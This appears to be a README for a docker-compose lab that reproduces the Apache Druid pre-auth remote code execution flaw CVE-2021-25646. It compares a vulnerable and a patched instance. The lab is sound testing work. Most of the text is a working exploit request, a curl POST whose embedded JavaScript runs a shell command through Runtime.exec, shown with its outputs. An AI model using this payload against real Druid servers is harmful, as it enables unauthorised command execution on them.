# Apache Druid Pre-Auth RCE vulnerability (CVE-2021-25646)

This folder contains a docker-compose configuration for testing Apache Druid CVE-2021-25646. The vulnerable version is 0.20.0 (port 8081) and the patched version is 0.20.1 (port 8082).

## Setup

```
docker compose up
```
The vulnerable instance will listen on port 8081 and the patched instance will listen on port 8082.

## Testing the Vulnerability


### Vulnerable Version
```
curl -X POST 'localhost:8081/druid/indexer/v1/sampler' -d '{  "type": "index",  "spec": {    "ioConfig": {      "type": "index",      "firehose": {        "type": "local",        "baseDir": "/etc",        "filter": "*"      }    },    "dataSchema": {      "dataSource": "xxxxxx",      "parser": {        "parseSpec": {          "format": "javascript",          "timestampSpec": {},          "dimensionsSpec": {},          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"printf %x 133713371337\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",          "": {            "enabled": "true"          }        }      }    }  },  "samplerConfig": {    "numRows": 10  }}' -v -H 'Content-Type: application/json'
```
Response:
```
... "kadkand":"1f21f020c9" ...
```

### Patched Version
```
curl -X POST 'localhost:8082/druid/indexer/v1/sampler' -d '{  "type": "index",  "spec": {    "ioConfig": {      "type": "index",      "firehose": {        "type": "local",        "baseDir": "/etc",        "filter": "*"      }    },    "dataSchema": {      "dataSource": "xxxxxx",      "parser": {        "parseSpec": {          "format": "javascript",          "timestampSpec": {},          "dimensionsSpec": {},          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"printf %x 133713371337\").getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",          "": {            "enabled": "true"          }        }      }    }  },  "samplerConfig": {    "numRows": 10  }}' -v -H 'Content-Type: application/json'
```
Response:
```
{"error":"Failed to sample data: JavaScript is disabled"}
```